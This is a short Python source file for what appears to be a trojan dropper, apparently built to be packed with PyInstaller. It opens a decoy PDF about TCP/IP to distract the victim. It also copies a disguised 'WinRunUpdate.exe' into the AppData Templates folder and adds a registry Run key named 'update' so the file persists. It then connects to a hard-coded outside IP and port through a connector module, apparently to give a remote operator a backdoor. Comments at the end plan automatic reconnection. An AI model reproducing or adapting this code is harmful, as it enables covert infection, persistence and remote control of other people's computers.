#!/usr/bin/env python

import subprocess, sys, os, connector

file_name = os.path.join(sys._MEIPASS, "tcp_ip_intro.pdf")
subprocess.Popen(file_name, shell=True)

file_src = os.path.join(sys._MEIPASS, "WinRunUpdate.exe")
folder_dest = os.path.join(os.environ["appdata"], "Microsoft", "Windows", "Templates")
if not os.path.exists(folder_dest + "\\WinRunUpdate.exe"):
    subprocess.call(["move", file_src, folder_dest], shell=True)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + folder_dest + '\WinRunUpdate.exe"', shell=True)

try:
    connector.Connector("31.28.252.133", 49099).run()
except Exception:
    sys.exit()

# SystemExit do not catch
# Run main connection through second thread
# and check connection by main thread every 5 min,
# if connection is lost - interrupt the second thread and run it again
